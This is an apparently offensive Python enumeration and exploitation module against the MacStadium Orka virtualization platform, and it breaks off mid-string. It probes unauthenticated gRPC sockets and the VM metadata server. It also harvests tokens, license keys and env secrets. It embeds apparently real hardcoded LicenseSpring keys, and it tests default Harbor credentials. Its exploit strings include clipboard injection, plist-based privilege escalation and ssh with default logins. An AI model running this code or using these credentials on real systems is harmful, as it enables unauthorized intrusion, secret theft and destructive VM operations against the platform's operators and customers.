#!/usr/bin/env python3
"""
Orka Platform Enumeration Module
Synthesized from: MAC-STADIUM reverse engineering findings (F1-F106)

Enumerate MacStadium Orka platform (K8s-based macOS virtualization).
Engine: com.macstadium.orka-engine.server (Swift/NIO/gRPC, arm64)
Runner: com.macstadium.orka-engine.runvz (Virtualization.framework)
IPC:    /var/run/orka-engine.sock (engine) + per-VM run.sock (runvz)

New in this revision (F93-F106):
  F93  Clipboard injection via virtio serial (JSON, no auth)
  F96  Full ORKA_* env var set; SENTRY_DSN + LICENSE_KEY in plist
  F97  IPSW auto-download from Apple CDN (ImageDownloadLatestIPSW RPC)
  F98  VirtualMachineRepartition: destructive disk op, unauthenticated socket
  F99  Full gRPC service map (VirtualMachineService + ImageService + SystemService)
  F100 Two OCI layer media types: bv41 disk vs Apple Archive shared image
  F101 VMBundle dir at /opt/orka; per-VM run.sock bypasses engine socket
  F102 DHCPParser reads /var/db/dhcpd_leases; ORKA_ENGINE_DHCP_LEASE_TIME
  F103 orka-engine SwiftUI app on headless node (dead but linked AppKit paths)
  F104 ORKA_ENGINE_HELPER env var controls runvz path — plist write = privesc
  F105 All three LicenseSpring credentials hardcoded: api_key + product_code + shared_key
  F106 LicenseCheckServerInterceptor.shouldCheckLicense() bypass path exists
"""

import subprocess
import json
import os
import socket
import hmac
import hashlib
import base64
import stat
import urllib.request
import urllib.error
from datetime import datetime, timezone
from pathlib import Path

try:
    import requests as _requests
    _HAS_REQUESTS = True
except ImportError:
    _HAS_REQUESTS = False


def _http_get(url, headers=None, timeout=5):
    """HTTP GET — uses requests if available, falls back to urllib."""
    if _HAS_REQUESTS:
        try:
            r = _requests.get(url, headers=headers or {}, timeout=timeout, verify=False)
            body = r.text
            def _json():
                try:
                    return r.json()
                except Exception:
                    return {}
            return r.status_code, body, _json
        except Exception as e:
            return None, str(e), lambda: {}
    req = urllib.request.Request(url, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read().decode('utf-8', errors='replace')
            sc = resp.status
            def _json():
                try:
                    return json.loads(body)
                except Exception:
                    return {}
            return sc, body, _json
    except urllib.error.HTTPError as e:
        body = e.read().decode('utf-8', errors='replace')
        def _json():
            try:
                return json.loads(body)
            except Exception:
                return {}
        return e.code, body, _json
    except Exception as e:
        return None, str(e), lambda: {}


# ── RE-derived constants ──────────────────────────────────────────────────────
# Source: com.macstadium.orka-engine.server + orka-engine CLI, v3.5.2 (arm64)

# LicenseSpring SDK credentials (all three hardcoded in binary, F105)
LICENSESPRING_API_KEY     = "90ECE379-E9F0-4393-BC58-64FD7F078F7E"   # api_key (F75)
LICENSESPRING_PRODUCT_CODE = "8ad72323-35e5-477c-ab2c-ea2e080dadc1"  # product_code (F105)
LICENSESPRING_SHARED_KEY  = "C8J7gHUrvMSN52BEQpEYo-zapNplE9XWGR36tifssiE"  # HMAC key (F105)
LICENSESPRING_API         = "https://api.licensespring.com"

# Engine IPC paths
ORKA_ENGINE_SOCK          = "/var/run/orka-engine.sock"
ORKA_RUNVZ_SOCK_NAME      = "run.sock"       # per-VM bundle subdirectory

# Sentry relay (local)
SENTRY_STREAM_URL         = "http://localhost:8969/stream"

# Provisioning profile / team (F95)
ORKA_TEAM_ID              = "23KP83Z488"
ORKA_KEYCHAIN_GROUP       = f"{ORKA_TEAM_ID}.*"
ORKA_BUNDLE_ID            = "com.macstadium.orka-engine"

# MacStadium internal build path (F90 — leaked in orka-vm-tools binary)
ORKA_BUILD_PATH = (
    "/Users/devadmin/actions-runner/_work/monorepo-dev/"
    "monorepo-dev/packages/orka-engine/"
)

# Metadata server (F87 — confirmed port 80)
ORKA_METADATA_HOST        = "169.254.169.254"
ORKA_METADATA_PORT        = 80

# All ORKA_* env vars — server binary (16 vars, F96) + CLI-only (1 var, F102)
ORKA_ENV_VARS_SERVER = [
    'ORKA_CLIPBOARD_SHARING',
    'ORKA_CLUSTER',
    'ORKA_CUSTOMER',
    'ORKA_ENGINE_FLUSH',
    'ORKA_ENGINE_HELPER',               # F104 — controls runvz binary path
    'ORKA_ENGINE_LICENSE_KEY',
    'ORKA_ENGINE_LICENSE_PRODUCT_CODE', # LicenseSpring product_code override
    'ORKA_ENGINE_LOG_FILE',
    'ORKA_ENGINE_LOG_LEVEL',
    'ORKA_ENGINE_LOG_STDOUT',
    'ORKA_ENGINE_SENTRY_DSN',
    'ORKA_ENGINE_SOCK',
    'ORKA_ENGINE_TERMINAL',
    'ORKA_ENGINE_VIRTUAL_MACHINE_START_TIMEOUT',
    'ORKA_ENGINE_VIRTUAL_MACHINE_USER',
    'ORKA_ENVIRONMENT',
]
ORKA_ENV_VARS_CLI_ONLY = [
    'ORKA_ENGINE_DHCP_LEASE_TIME',      # F102 — overrides DHCP lease duration
]
ORKA_ENV_VARS = ORKA_ENV_VARS_SERVER + ORKA_ENV_VARS_CLI_ONLY

# Orka engine filesystem layout (Ansible role defaults + binary RE)
ORKA_FS = {
    'binary':    '/usr/local/libexec/orka-engine.app/Contents/MacOS/com.macstadium.orka-engine.server',
    'runvz':     '/usr/local/libexec/orka-engine.app/Contents/Helpers/Orka Engine Runner.app/Contents/MacOS/com.macstadium.orka-engine.runvz',
    'helper':    '/usr/local/bin/orka-engine',
    'sock':      '/var/run/orka-engine.sock',
    'state_dir': '/opt/orka',           # orkaDirURL base path (F101)
    'vm_dir':    '/opt/orka/vms',       # VMBundle directory (F101)
    'dhcp_leases': '/var/db/dhcpd_leases',  # F102 — VM MAC→IP oracle
    'log':       '/opt/orka/logs/com.macstadium.orka-engine.server.managed.log',
    'plist':     '/Library/LaunchDaemons/com.macstadium.orka-engine.server.managed.plist',
    'launchagent': '/Library/LaunchAgents/com.macstadium.orka-engine.server.plist',
    'profile':   '/usr/local/libexec/orka-engine.app/Contents/embedded.provisionprofile',
}

# ── orka3 CLI binary RE constants (extracted 2026-08-13) ─────────────────────
# Source: strings analysis of /home/cowboy/VDT/tools/orka3/orka3 (Go ELF, 77MB)
# Build path: /home/runner/work/monorepo-dev/monorepo-dev/packages/orka-cli-v2/pkg/orkaapiserver/api.go
# Go module path: macstadium.com/orka-cli-v2 (devel)

# Orka API server endpoints (hardcoded in CLI help text)
ORKA_API_SERVER_NEW  = 'http://10.221.188.20'   # Orka 2.1+ default
ORKA_API_SERVER_OLD  = 'http://10.221.188.100'  # pre-2.1 default
ORKA_API_ENDPOINT    = '/api/v1/cluster-info'   # first confirmed API path
ORKA_DEFAULT_NS      = 'orka-default'           # all VM configs namespace

# Harbor registry — default credentials confirmed in binary (CLI example usage)
HARBOR_HOST          = 'http://10.221.188.5:30080'
HARBOR_USER          = 'admin'
HARBOR_PASS          = 'p@ssw0rd'
HARBOR_INSECURE_FLAG = '--allow-insecure'

# Token storage: Orka stores auth JWT in ~/.kube/config after OIDC login
# OIDC callback: localhost:<dynamic_port>/callback — AuthServer struct
ORKA_TOKEN_PATH      = '~/.kube/config'
ORKA_CONFIG_JSON_KEY = 'api-url'           # json struct tag in config struct

# K8s CRD types deployed by orka-operator
ORKA_CRDS = ['Image', 'ImageList', 'ImageCache', 'ImageCacheList', 'Iso', 'IsoList']

# orka3 CLI command surface (extracted from go:symbol table)
ORKA3_COMMANDS = {
    'config':             ['ReadConfig', 'WriteConfig', 'GetDefaultConfigFilePath'],
    'vm':                 ['deployVM', 'createVM', 'deleteVm', 'nameVM', 'saveImage',
                           'commitImage', 'resizeImage', 'vmPush', 'executeCommand',
                           'waitForVM', 'validateCredentials'],
    'vm_config':          ['createVmConfig', 'deleteVmConfig', 'listVmConfig'],
    'user':               ['doLogin', 'doLogout', 'GetToken', 'extractIdToken',
                           'fetchClusterInfo', 'createTokenWithNoExpiration',
                           'listenOnNextFreePort', 'forceIPv4'],
    'serviceaccount':     ['createServiceAccount', 'createServiceAccountToken',
                           'createTokenWithNoExpiration', 'deleteServiceAccount'],
    'rolebinding':        ['addSubjects', 'removeSubjects', 'getOrkaResourcesRolebinding'],
    'registrycredential': ['addCredentials', 'removeCredentials', 'listServers'],
    'namespace':          ['createNamespace', 'deleteNamespaces', 'getNamespaceDetails'],
    'node':               ['tagNode', 'untagNode', 'namespaceNode'],
    'imagecache':         ['cacheImage', 'removeImage', 'getImageCacheInfo'],
}

# OCI media types (F100)
OCI_MEDIA_TYPES = {
    'disk_layer': 'application/vnd.macstadium.orka-engine.disk.layer.v1+lz4',
    'shared_img': 'application/vnd.macstadium.orka-si.image.layer.v1.aar+lz4',
}

# gRPC service map — CONFIRMED from ServerInterceptor<X,Y> type pairs (F108)
# 20 RPCs total across 4 intercepted services + 5 RunVZService routes (per-VM socket)
ORKA_GRPC_SERVICES = {
    # All on /var/run/orka-engine.sock
    # Return types: VMList→VirtualMachineListResponse, VMStart→VirtualMachineStartResponse,
    #               VMInstall→VirtualMachineInstallResponse, all others→google.protobuf.Empty
    'VirtualMachineService': [
        'List', 'Create', 'Start', 'Stop', 'Restart', 'Delete',
        'Clone', 'Edit', 'Save',
        'Console',      # F107 — VM serial/VNC access, any socket holder can attach
        'Install',      # VZMacOSRestoreImage-based install
        'Repartition',  # F98 — destructive disk op; log: " disk repartitioned"
    ],
    # ImageList and DownloadLatestIPSW take google.protobuf.Empty (zero-byte body)
    'ImageService': [
        'List',                # takes Empty — trivially exploitable with socket access
        'Pull', 'Push', 'Copy', 'Delete',
        'DownloadLatestIPSW',  # F97 — triggers macOS IPSW download from Apple CDN
    ],
    # 1 confirmed RPC (Empty→Empty), source: SystemProvider.swift (F106)
    # Method name not resolved — "Ping" is speculative
    'SystemService': ['Ping'],
    # VMs call Register() on boot — "received callback from VM" log string (F108)
    'VirtualMachineRegistrationService': ['Register'],
}

# RunVZService — per-VM run.sock (engine→runvz), gRPC paths confirmed (F108)
ORKA_RUNVZ_METHODS = [
    'Console',      # VM console access
    'Info',         # VM state query
    'Repartition',  # destructive disk repartition (also F98)
    'Restart',
    'Stop',
]


class OrkaEnumerator:
    """Enumerate Orka platform — covers both node-level and VM-level access."""

    def __init__(self):
        self.in_orka_vm = False
        self.on_orka_node = False
        self.orka_api_reachable = False
        self.metadata_server = None
        self.api_servers = [
            'http://10.221.188.20',
            'http://10.221.188.100',
        ]
        self.cluster_info = None
        self.vms = []
        self.images = []
        self.service_accounts = []
        self.secrets = []
        self.findings = []
        self.token = None

    # ── Main entry point ─────────────────────────────────────────────────────

    def enumerate_all(self):
        """Run all Orka enumeration checks."""
        self.check_in_orka_vm()
        self.on_orka_node = self.check_engine_install().get('binary', False)
        self.check_api_reachable()

        if self.in_orka_vm:
            self.check_metadata_server()
            self.probe_clipboard_injection()

        if self.on_orka_node:
            self.check_vmBundle_dir()
            self.check_launchagent_writable()
            self.probe_dhcp_leases()

        if self.orka_api_reachable:
            self.get_cluster_info()
            self.check_authentication()
            if self.token:
                self.enumerate_vms()
                self.enumerate_images()
                self.enumerate_service_accounts()

        self.enumerate_engine_env_vars()
        self.probe_engine_grpc_socket()
        self.probe_sentry_stream()
        self.probe_licensespring()

        if self.token:
            self.check_security_issues()

        return {
            'in_orka_vm':       self.in_orka_vm,
            'on_orka_node':     self.on_orka_node,
            'orka_api_reachable': self.orka_api_reachable,
            'metadata_server':  self.metadata_server,
            'cluster_info':     self.cluster_info,
            'authenticated':    bool(self.token),
            'vms':              self.vms,
            'images':           self.images,
            'service_accounts': self.service_accounts,
            'findings':         self.findings,
        }

    # ── Detection ─────────────────────────────────────────────────────────────

    def check_in_orka_vm(self):
        """Detect if running inside an Orka VM."""
        for path in ['/Library/Application Support/Orka', '/usr/local/bin/orka-vm-info']:
            if Path(path).exists():
                self.in_orka_vm = True
                return True

        # Metadata server presence = inside Orka VM (F87 — port 80)
        sc, body, _ = _http_get(f'http://{ORKA_METADATA_HOST}:{ORKA_METADATA_PORT}/metadata', timeout=2)
        if sc == 200:
            self.in_orka_vm = True
        return self.in_orka_vm

    def check_api_reachable(self):
        """Check if Orka API server is reachable."""
        for api_url in self.api_servers:
            sc, _, _ = _http_get(f'{api_url}/version', timeout=3)
            if sc == 200:
                self.orka_api_reachable = True
                return api_url
        return None

    def probe_orka3_api_cluster_info(self) -> dict:
        """
        Probe /api/v1/cluster-info — confirmed endpoint from orka3 binary RE.
        Binary embeds: '/api/v1/cluster-infoinvalid token claims...'
        unauthenticated access = cluster topology disclosure.
        """
        results = {}
        for api_url in [ORKA_API_SERVER_NEW, ORKA_API_SERVER_OLD]:
            sc, body, get_json = _http_get(f'{api_url}{ORKA_API_ENDPOINT}', timeout=5)
            data = get_json()
            results[api_url] = {
                'status': sc,
                'data': data,
                'raw': body[:500] if body else None,
            }
            if sc == 200 and data:
                self.findings.append(
                    f'ORKA_CLUSTER_INFO_UNAUTH: {api_url}{ORKA_API_ENDPOINT} '
                    f'returned cluster data without auth'
                )
                self.cluster_info = data
        return results

    def probe_harbor_default_creds(self) -> dict:
        """
        Test Harbor registry with default credentials confirmed from orka3 binary.
        Binary example: orka3 regcred add --allow-insecure http://10.221.188.5:30080
                        --username admin --password p@ssw0rd
        """
        results = {}
        import base64
        cred = base64.b64encode(f'{HARBOR_USER}:{HARBOR_PASS}'.encode()).decode()
        # Harbor v2 API health
        sc, body, _ = _http_get(
            f'{HARBOR_HOST}/api/v2.0/systeminfo',
            headers={'Authorization': f'Basic {cred}'},
            timeout=5,
        )
        results['health'] = {'status': sc, 'auth': 'admin:p@ssw0rd', 'body': body[:300]}
        if sc == 200:
            self.findings.append(
                f'HARBOR_DEFAULT_CREDS: {HARBOR_HOST} accessible with admin:p@ssw0rd'
            )
        # Harbor projects
        sc2, body2, get_json2 = _http_get(
            f'{HARBOR_HOST}/api/v2.0/projects',
            headers={'Authorization': f'Basic {cred}'},
            timeout=5,
        )
        results['projects'] = {'status': sc2, 'data': get_json2()}
        return results

    # ── Metadata server (VM-side) ─────────────────────────────────────────────

    def check_metadata_server(self):
        """Enumerate VM metadata server at 169.254.169.254:80 (F87, F88)."""
        base = f'http://{ORKA_METADATA_HOST}:{ORKA_METADATA_PORT}'

        # /metadata returns {"keys":[...]} (F88)
        sc, body, get_json = _http_get(f'{base}/metadata', timeout=2)
        if sc != 200:
            return None

        data = get_json()
        keys = data.get('keys', [])

        metadata = {}
        for key in keys:
            sc2, body2, _ = _http_get(f'{base}/metadata/{key}', timeout=1)
            if sc2 == 200:
                try:
                    metadata[key] = json.loads(body2).get('value', body2)
                except Exception:
                    metadata[key] = body2

        self.metadata_server = {'available': True, 'keys': keys, 'metadata': metadata}

        self.findings.append({
            'type': 'Unauthenticated VM Metadata Server',
            'severity': 'HIGH',
            'description': 'VM metadata accessible at 169.254.169.254:80/metadata without auth (F88)',
            'detail': f'Keys: {keys}',
            'exploit': (
                'curl http://169.254.169.254/metadata — any process in VM reads all metadata. '
                'Content set by orka-engine via ORKA_VM_METADATA env var (JSON); may include '
                'CI tokens, VM identity, org info.'
            ),
        })

        # Check debug endpoints (F83, F85)
        for ep in ['/debug/pprof/', '/debug/vars']:
            sc3, _, _ = _http_get(f'{base}{ep}', timeout=2)
            if sc3 == 200:
                self.findings.append({
                    'type': f'Debug Endpoint Exposed: {ep}',
                    'severity': 'MEDIUM',
                    'description': f'Go debug endpoint at 169.254.169.254:80{ep} (F83/F85)',
                    'detail': f'{base}{ep}',
                    'exploit': (
                        'pprof: goroutine stacks + heap dumps. '
                        'expvar: exported runtime counters.'
                    ),
                })

        return self.metadata_server

    # ── Clipboard injection via virtio serial (F93) ───────────────────────────

    def probe_clipboard_injection(self):
        """Detect virtio serial port available for clipboard injection (F93)."""
        virtio_paths = ['/dev/tty.virtio', '/dev/cu.virtio', '/dev/ttyS0']
        for path in virtio_paths:
            if Path(path).exists():
                self.findings.append({
                    'type': 'Virtio Serial Clipboard Injection',
                    'severity': 'HIGH',
                    'description': (
                        f'Virtio serial port {path} present — unauthenticated clipboard injection '
                        'into host (F93)'
                    ),
                    'detail': f'Wire format: {{"action":"clipboard_contents","data":"<payload>"}} + newline',
                    'exploit': (
                        f'echo \'{{"action":"clipboard_contents","data":"pwned"}}\' > {path}\n'
                        'Host clipboard is overwritten. VM isolation boundary crossed. '
                        'No authentication, no HMAC on message.'
                    ),
                })
                return True
        return False

    # ── Node-side checks ──────────────────────────────────────────────────────

    def check_engine_install(self):
        """Detect orka-engine installation on current macOS host (F95, F101)."""
        indicators = {k: Path(v).exists() for k, v in ORKA_FS.items()}

        if indicators.get('binary'):
            self.findings.append({
                'type': 'Orka Engine Installed',
                'severity': 'INFO',
                'description': 'orka-engine.server daemon present on this host',
                'detail': (
                    f"Team: {ORKA_TEAM_ID} | "
                    f"Keychain group: {ORKA_KEYCHAIN_GROUP} (wildcard — reads ALL MacStadium keychain items)"
                ),
                'exploit': (
                    'Engine process holds com.apple.vm.networking + keychain-access-groups=23KP83Z488.* '
                    'entitlements (F95). Compromise engine → full team keychain access.'
                ),
            })

        if indicators.get('log'):
            self.findings.append({
                'type': 'Orka Engine Log Readable',
                'severity': 'LOW',
                'description': 'Engine log may leak license keys, gRPC errors, image paths',
                'detail': ORKA_FS['log'],
                'exploit': f'cat {ORKA_FS["log"]} | grep -i license',
            })

        return indicators

    def check_vmBundle_dir(self):
        """Check /opt/orka/vms VMBundle directory permissions (F101)."""
        vm_dir = Path(ORKA_FS['vm_dir'])
        state_dir = Path(ORKA_FS['state_dir'])

        for check_path in [vm_dir, state_dir]:
            if not check_path.exists():
                continue
            try:
                st = check_path.stat()
                mode = stat.filemode(st.st_mode)
                world_readable = bool(st.st_mode & stat.S_IROTH)
                world_writable = bool(st.st_mode & stat.S_IWOTH)

                if world_readable or world_writable:
                    self.findings.append({
                        'type': f'VMBundle Directory Permissive: {check_path}',
                        'severity': 'HIGH',
                        'description': (
                            f'{check_path} is {mode} — VMBundle dirs (config.json, metadata.json, '
                            'run.sock) may be accessible (F101)'
                        ),
                        'detail': f'UID: {st.st_uid} GID: {st.st_gid} Mode: {mode}',
                        'exploit': (
                            f'ls {check_path}/*/run.sock 2>/dev/null — per-VM Unix sockets '
                            'for runvz. Direct gRPC to runvz bypasses engine auth entirely.'
                        ),
                    })
            except PermissionError:
                pass

        # Probe any per-VM run.sock we can reach
        self._probe_vm_runsocks(vm_dir)

    def _probe_vm_runsocks(self, vm_dir):
        """Find and probe per-VM run.sock files (F101)."""
        if not vm_dir.exists():
            return
        try:
            for entry in vm_dir.iterdir():
                sock_path = entry / ORKA_RUNVZ_SOCK_NAME
                if not sock_path.exists():
                    continue
                try:
                    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
                    s.settimeout(1)
                    s.connect(str(sock_path))
                    s.sendall(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')
                    banner = s.recv(64)
                    s.close()
                    self.findings.append({
                        'type': f'Per-VM runvz Socket Accessible: {sock_path}',
                        'severity': 'CRITICAL',
                        'description': 'Direct access to runvz (Virtualization.framework) without engine auth (F101)',
                        'detail': f'Banner: {banner[:32]!r}',
                        'exploit': 'Craft raw protobuf RPCs against runvz to control VM lifecycle',
                    })
                except Exception:
                    pass
        except PermissionError:
            pass

    def check_launchagent_writable(self):
        """Check if LaunchAgent/LaunchDaemon plist is writable (F104)."""
        targets = [
            (ORKA_FS['plist'],       'LaunchDaemon (server)'),
            (ORKA_FS['launchagent'], 'LaunchAgent (CLI)'),
        ]
        for plist_path, label in targets:
            p = Path(plist_path)
            if not p.exists():
                continue
            try:
                st = p.stat()
                mode = stat.filemode(st.st_mode)
                writable_by_others = bool(st.st_mode & (stat.S_IWGRP | stat.S_IWOTH))
                if writable_by_others or os.access(plist_path, os.W_OK):
                    self.findings.append({
                        'type': f'Orka LaunchAgent Plist Writable: {plist_path}',
                        'severity': 'CRITICAL',
                        'description': (
                            f'{label} plist writable — setting ORKA_ENGINE_HELPER to attacker binary '
                            'gives arbitrary code execution with com.apple.vm.networking + '
                            'keychain-access-groups=23KP83Z488.* entitlements (F104)'
                        ),
                        'detail': f'Mode: {mode} | UID: {st.st_uid}',
                        'exploit': (
                            f'Edit {plist_path} → set ORKA_ENGINE_HELPER=/tmp/evil → '
                            'launchctl unload/load → evil binary executes as engine with full entitlements'
                        ),
                    })
            except PermissionError:
                pass

    def probe_dhcp_leases(self):
        """Check /var/db/dhcpd_leases readability — VM MAC→IP oracle (F102)."""
        leases_path = ORKA_FS['dhcp_leases']
        if not Path(leases_path).exists():
            return None

        try:
            content = Path(leases_path).read_text(errors='replace')
            # Parse simple key=value lease blocks
            leases = []
            current = {}
            for line in content.splitlines():
                line = line.strip()
                if line == '{':
                    current = {}
                elif line == '}':
                    if current:
                        leases.append(current)
                    current = {}
                elif '=' in line:
                    k, _, v = line.partition('=')
                    current[k.strip()] = v.strip()

            if leases:
                self.findings.append({
                    'type': 'DHCP Lease File Readable',
                    'severity': 'MEDIUM',
                    'description': f'/var/db/dhcpd_leases readable — maps VM MAC→IP for all {len(leases)} VMs (F102)',
                    'detail': f'First lease: {leases[0]}',
                    'exploit': (
                        'Read leases to enumerate all VM IPs on node. '
                        'Forge/modify leases to redirect engine VM IP resolution.'
                    ),
                })
                return leases
        except PermissionError:
            pass
        return None

    # ── Env var harvesting ────────────────────────────────────────────────────

    def enumerate_engine_env_vars(self):
        """Harvest ORKA_* env vars from current environment and plist (F96)."""
        found = {}

        for var in ORKA_ENV_VARS:
            val = os.getenv(var)
            if val:
                found[var] = val

        # Try LaunchDaemon plist (F96 — contains license key + DSN)
        for plist_path in [ORKA_FS['plist'], ORKA_FS['launchagent']]:
            if not Path(plist_path).exists():
                continue
            try:
                result = subprocess.run(
                    ['plutil', '-convert', 'json', '-o', '-', plist_path],
                    capture_output=True, text=True, timeout=3,
                )
                if result.returncode == 0:
                    plist = json.loads(result.stdout)
                    env_dict = plist.get('EnvironmentVariables', {})
                    if isinstance(env_dict, dict):
                        for k, v in env_dict.items():
                            if k.startswith('ORKA_'):
                                found[k] = v
            except Exception:
                pass

        if 'ORKA_ENGINE_LICENSE_KEY' in found:
            self.findings.append({
                'type': 'Orka License Key Exposed',
                'severity': 'HIGH',
                'description': 'ORKA_ENGINE_LICENSE_KEY found in environment or plist (F96)',
                'detail': f"Key: {found['ORKA_ENGINE_LICENSE_KEY'][:8]}...",
                'exploit': (
                    'License key + shared_key → LicenseSpring SDK API → enumerate all '
                    'hardware_ids bound to this product (customer node inventory).'
                ),
            })

        if 'ORKA_ENGINE_SENTRY_DSN' in found:
            self.findings.append({
                'type': 'Sentry DSN Exposed',
                'severity': 'MEDIUM',
                'description': 'ORKA_ENGINE_SENTRY_DSN found — MacStadium Sentry project DSN accessible (F96)',
                'detail': found['ORKA_ENGINE_SENTRY_DSN'],
                'exploit': (
                    'POST fake crash events to MacStadium Sentry project. '
                    'DSN authorizes event submission (write-only, but floods their alerting).'
                ),
            })

        if 'ORKA_ENGINE_HELPER' in found:
            self.findings.append({
                'type': 'ORKA_ENGINE_HELPER Path Override Active',
                'severity': 'HIGH',
                'description': 'ORKA_ENGINE_HELPER set — non-default runvz binary path in use (F104)',
                'detail': f"Helper: {found['ORKA_ENGINE_HELPER']}",
                'exploit': 'If path is attacker-controlled, runvz is replaced. Check binary at path.',
            })

        return found

    # ── Cluster API ──────────────────────────────────────────────────────────

    def get_cluster_info(self):
        """Get cluster info from unauthenticated endpoint (F1)."""
        for api_url in self.api_servers:
            sc, body, get_json = _http_get(f'{api_url}/api/v1/cluster-info', timeout=3)
            if sc == 200:
                self.cluster_info = get_json()
                self.findings.append({
                    'type': 'Unauthenticated cluster-info',
                    'severity': 'MEDIUM',
                    'description': 'Cluster info exposed without authentication (F1)',
                    'detail': f"K8s API: {self.cluster_info.get('apiEndpoint', 'N/A')}",
                    'exploit': 'Exposes K8s CA cert, OAuth client ID, cluster topology before auth.',
                })
                return self.cluster_info
        return None

    def check_authentication(self):
        """Find Orka/K8s token from kubeconfig or env."""
        kubeconfig = Path.home() / '.kube' / 'config'
        if kubeconfig.exists():
            try:
                import yaml
                config = yaml.safe_load(kubeconfig.read_text())
                for user in config.get('users', []):
                    token = user.get('user', {}).get('token')
                    if token:
                        self.token = token
                        break
            except Exception:
                pass

        if not self.token:
            self.token = os.getenv('ORKA_TOKEN') or os.getenv('K8S_TOKEN')

        return bool(self.token)

    def enumerate_vms(self):
        """List VMs (requires auth)."""
        if not self.token:
            return []
        headers = {'Authorization': f'Bearer {self.token}'}
        for api_url in self.api_servers:
            sc, _, get_json = _http_get(f'{api_url}/api/v1/namespaces', headers=headers, timeout=5)
            if sc != 200:
                continue
            namespaces = get_json()
            for ns in namespaces:
                ns_name = ns.get('name', 'orka-default')
                sc2, _, get_json2 = _http_get(
                    f'{api_url}/api/v1/namespaces/{ns_name}/vms',
                    headers=headers, timeout=5,
                )
                if sc2 != 200:
                    continue
                for vm in get_json2():
                    self.vms.append({
                        'name':     vm.get('vm_name'),
                        'namespace': ns_name,
                        'status':   vm.get('vm_status'),
                        'ip':       vm.get('vnc_host'),
                        'ssh_port': vm.get('ssh_port', 8822),
                        'vnc_port': vm.get('vnc_port', 5999),
                    })
                    if vm.get('ssh_port'):
                        self.findings.append({
                            'type': 'VM with Default Credentials',
                            'severity': 'CRITICAL',
                            'description': f"VM {vm.get('vm_name')} likely has admin:admin (F2)",
                            'detail': f"SSH: {vm.get('vnc_host')}:{vm.get('ssh_port', 8822)}",
                            'exploit': f"ssh admin@{vm.get('vnc_host')} -p {vm.get('ssh_port', 8822)}",
                        })
        return self.vms

    def enumerate_images(self):
        """List images (requires auth)."""
        if not self.token:
            return []
        headers = {'Authorization': f'Bearer {self.token}'}
        for api_url in self.api_servers:
            sc, _, get_json = _http_get(
                f'{api_url}/api/v1/namespaces/orka-default/images',
                headers=headers, timeout=5,
            )
            if sc == 200:
                self.images = get_json()
        return self.images

    def enumerate_service_accounts(self):
        """List service accounts (requires auth)."""
        if not self.token:
            return []
        headers = {'Authorization': f'Bearer {self.token}'}
        for api_url in self.api_servers:
            sc, _, get_json = _http_get(
                f'{api_url}/api/v1/namespaces/orka-default/serviceaccounts',
                headers=headers, timeout=5,
            )
            if sc == 200:
                self.service_accounts = get_json()
        return self.service_accounts

    # ── gRPC socket probes ───────────────────────────────────────────────────

    def probe_engine_grpc_socket(self):
        """Probe orka-engine Unix gRPC socket and check for specific RPCs (F98, F99)."""
        result = {'engine_sock': False, 'repartition_check': False}

        sock_path = ORKA_ENGINE_SOCK
        if not Path(sock_path).exists():
            return result

        try:
            s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect(sock_path)
            s.sendall(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')
            banner = s.recv(64)
            s.close()
            result['engine_sock'] = True
            self.findings.append({
                'type': 'Orka Engine gRPC Socket Accessible',
                'severity': 'CRITICAL',
                'description': f'Engine gRPC Unix socket readable without auth token (F99)',
                'detail': (
                    f'Socket: {sock_path} | Banner: {banner[:32]!r}\n'
                    f'Services: VirtualMachineService ({len(ORKA_GRPC_SERVICES["VirtualMachineService"])} RPCs), '
                    f'ImageService ({len(ORKA_GRPC_SERVICES["ImageService"])} RPCs), '
                    f'SystemService ({len(ORKA_GRPC_SERVICES["SystemService"])} RPCs)'
                ),
                'exploit': (
                    'Send protobuf RPCs: VMList (enumerate all VMs), VMStart, VMDelete, ImagePull. '
                    'VirtualMachineRepartition (F98) is a destructive disk repartition op — '
                    'no confirmation, no auth gate on socket.'
                ),
            })
        except Exception:
            pass

        return result

    # ── Sentry relay ─────────────────────────────────────────────────────────

    def probe_sentry_stream(self):
        """Check if Sentry RR-Web relay is running (localhost:8969/stream)."""
        sc, _, _ = _http_get(SENTRY_STREAM_URL, timeout=1)
        if sc in (200, 204):
            self.findings.append({
                'type': 'Sentry RR-Web Stream Active',
                'severity': 'MEDIUM',
                'description': 'Engine relays session-replay events to Sentry at localhost:8969 (F77)',
                'detail': SENTRY_STREAM_URL,
                'exploit': 'Intercept stream to observe gRPC call events, VM lifecycle, errors.',
            })
            return True
        return False

    # ── LicenseSpring ────────────────────────────────────────────────────────

    def _licensespring_hmac_auth(self, date_str):
        """Build LicenseSpring SDK HMAC-SHA256 Authorization header (F105).

        SDK API v1 auth:
          string-to-sign = "licenseSpring\\ndate: {RFC1123}"
          signature      = base64(HMAC-SHA256(shared_key, string-to-sign))
          header         = algorithm="hmac-sha256", headers="date",
                           signature="{b64}", apiKey="{api_key}"

        Note: apiKey = api_key (UUID2), NOT product_code.
        """
        msg = f"licenseSpring\ndate: {date_str}"
        sig = base64.b64encode(
            hmac.new(LICENSESPRING_SHARED_KEY.encode(), msg.encode(), hashlib.sha256).digest()
        ).decode()
        return (
            f'algorithm="hmac-sha256", headers="date", '
            f'signature="{sig}", apiKey="{LICENSESPRING_API_KEY}"'
        )

    def _licensespring_basic_auth(self):
        """Build LicenseSpring Management API v4 Basic auth header (F105).

        Management API v4 uses Basic auth: username=api_key, password=api_key.
        """
        creds = base64.b64encode(
            f'{LICENSESPRING_API_KEY}:{LICENSESPRING_API_KEY}'.encode()
        ).decode()
        return f'Basic {creds}'

    def probe_licensespring(self):
        """Enumerate LicenseSpring using credentials extracted from binary (F105)."""
        result = {
            'api_key':       LICENSESPRING_API_KEY,
            'product_code':  LICENSESPRING_PRODUCT_CODE,
            'shared_key':    LICENSESPRING_SHARED_KEY[:8] + '...',
            'sdk_auth_valid':  False,
            'mgmt_auth_valid': False,
            'product':         {},
            'activations':     [],
        }

        # Always report the hardcoded credential finding
        self.findings.append({
            'type': 'LicenseSpring Credentials Hardcoded in Binary (F105)',
            'severity': 'CRITICAL',
            'description': (
                'All three LicenseSpring SDK credentials hardcoded in orka-engine-3.5.2 binary '
                '(api_key + product_code + shared_key, stored contiguously at offset ~0x8ed000)'
            ),
            'detail': (
                f'api_key:      {LICENSESPRING_API_KEY}\n'
